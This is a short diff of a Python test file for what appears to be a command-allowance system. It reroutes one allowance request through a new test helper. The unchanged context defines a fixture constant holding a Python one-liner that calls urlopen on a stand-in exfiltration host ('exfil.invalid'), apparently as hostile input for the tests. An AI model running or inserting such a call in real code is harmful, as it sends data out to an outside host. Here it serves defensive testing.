@@ -14,6 +14,7 @@ from tests.test_0224_critique import Agent
 from tests.test_r25_s8 import _release, _rid, reasons, PY_NET
 from tests.test_n15_2910 import _bump
 from app import actions
+from tests import viewkit  # noqa: E402  (r0352: decisions name the view)
 
 SHA = "0123456789abcdef0123456789abcdef01234567"
 CODE = "import urllib.request; urllib.request.urlopen('https://exfil.invalid/x')"
@@ -155,7 +156,7 @@ def _day1(a):
             al = {"v": "deus-aar-0.1", "t": "allowance", "id": "al_" + base64.b32encode(os.urandom(16)).decode().rstrip("=")[:26],
                   "mandate": mandate_hash(wire.cbor_form(g["mandate"])), "class": "command", "commands": o["commands"], "project": o["project"],
                   "nbf": o["t"], "exp": o["t"] + 30 * 86400}
-            r = a.o.post("/api/allowances", rid=rid, envelope_b64=a.o.sign("application/aar-allowance+cbor", wa.cde(al)))
+            r = viewkit.allow(a.o, rid, al, "application/aar-allowance+cbor")[0]
             assert r.status_code == 200, r.text
     _bump(a)
 
